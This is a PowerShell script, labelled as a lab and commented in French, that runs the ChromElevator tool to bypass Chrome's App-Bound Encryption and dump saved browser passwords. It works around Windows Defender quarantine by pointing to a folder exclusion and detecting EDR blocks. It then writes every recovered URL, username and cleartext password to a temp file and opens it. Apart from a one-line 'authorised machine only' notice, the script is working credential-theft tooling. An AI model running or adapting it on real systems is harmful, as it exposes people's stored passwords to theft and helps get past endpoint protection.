# Lab : mots de passe Chrome via ChromElevator (IElevator / ABE) — pas un simple .ps1.
# Binaire : xaitax/Chrome-App-Bound-Encryption-Decryption (releases GitHub).
# Defender peut supprimer chromelevator_x64.exe → exclusion dossier lab avant usage.
param(
    [string]$Browser = 'chrome',
    [string]$ElevatorDir = '',
    [string]$OutputBase = ''
)

$ErrorActionPreference = 'Stop'

if (-not $ElevatorDir) {
    $localLab = Join-Path $PSScriptRoot '..\lab\chromelevator\extracted'
    if (Test-Path -LiteralPath $localLab) { $ElevatorDir = $localLab }
    else { $ElevatorDir = Join-Path $env:TEMP 'chromelevator' }
}
New-Item -ItemType Directory -Force -Path $ElevatorDir | Out-Null
$ElevatorDir = (Resolve-Path -LiteralPath $ElevatorDir).Path

$zip = Join-Path (Split-Path $ElevatorDir -Parent) 'chrome-injector-v0.20.0.zip'
$want = if ($env:PROCESSOR_ARCHITECTURE -match '^ARM') { 'chromelevator_arm64.exe' } else { 'chromelevator_x64.exe' }
$exe = Join-Path $ElevatorDir $want
if (-not (Test-Path -LiteralPath $exe) -and (Test-Path -LiteralPath $zip)) {
    Expand-Archive -Force -Path $zip -DestinationPath $ElevatorDir
    Start-Sleep -Milliseconds 500
}
if (-not (Test-Path -LiteralPath $exe)) {
    $defenderHint = ''
    try {
        $last = Get-MpThreatDetection -ErrorAction Stop |
            Where-Object { $_.Resources -match 'chromelevator' } |
            Select-Object -First 1
        if ($last) {
            $defenderHint = "Defender : $($last.InitialDetectionTime) — $($last.Resources -join '; ')"
        }
    } catch { }
    throw @"
$want introuvable (quarantaine Defender typique **sans exclusion** sur $ElevatorDir).
$defenderHint
Vérifie : Get-MpThreatDetection | ? Resources -match chromelevator
Source : https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases
"@
}

if (-not $OutputBase) { $OutputBase = Join-Path $env:TEMP 'chromelevator-out' }
New-Item -ItemType Directory -Force -Path $OutputBase | Out-Null

Write-Host "ChromElevator : $Browser -> $OutputBase"
Write-Host 'Machine autorisee uniquement.'

try {
    & $exe $Browser -o $OutputBase -v
    if ($LASTEXITCODE -ne 0) { exit $LASTEXITCODE }
} catch {
    if ($_.Exception.Message -match 'virus|indésirable|potentially unwanted|malware|0x800700E1') {
        throw "Lancement bloqué par Defender/EDR (fichier peut exister mais exécution refusée) : $exe`n$($_.Exception.Message)"
    }
    throw
}

$summary = Join-Path $env:TEMP 'chrome-leonardo-abe.txt'
$lines = [System.Collections.Generic.List[string]]::new()
$lines.Add('Chrome ABE export ' + (Get-Date -Format 'o'))
$lines.Add("Tool: chromelevator (IElevator)")
$lines.Add("Output: $OutputBase")
$lines.Add('')

$pwFiles = Get-ChildItem -LiteralPath $OutputBase -Recurse -Filter 'passwords.json' -ErrorAction SilentlyContinue
foreach ($f in $pwFiles) {
    $lines.Add('=== ' + $f.FullName + ' ===')
    try {
        $data = Get-Content -LiteralPath $f.FullName -Raw | ConvertFrom-Json
        foreach ($e in $data) {
            $url = $e.origin_url ?? $e.url ?? $e.hostname ?? '?'
            $user = $e.username_value ?? $e.username ?? ''
            $pass = $e.password_value ?? $e.password ?? ''
            $lines.Add('URL:  ' + $url)
            $lines.Add('User: ' + $user)
            $lines.Add('Pass: ' + $pass)
            $lines.Add('')
        }
    } catch {
        $lines.Add('(parse JSON: ' + $_.Exception.Message + ')')
    }
}

if ($pwFiles.Count -eq 0) {
    $lines.Add('Aucun passwords.json sous ' + $OutputBase)
    $lines.Add('Verifie la sortie console ChromElevator.')
}

$lines | Set-Content -LiteralPath $summary -Encoding utf8
Start-Process notepad.exe -ArgumentList $summary
Write-Host "Resume : $summary"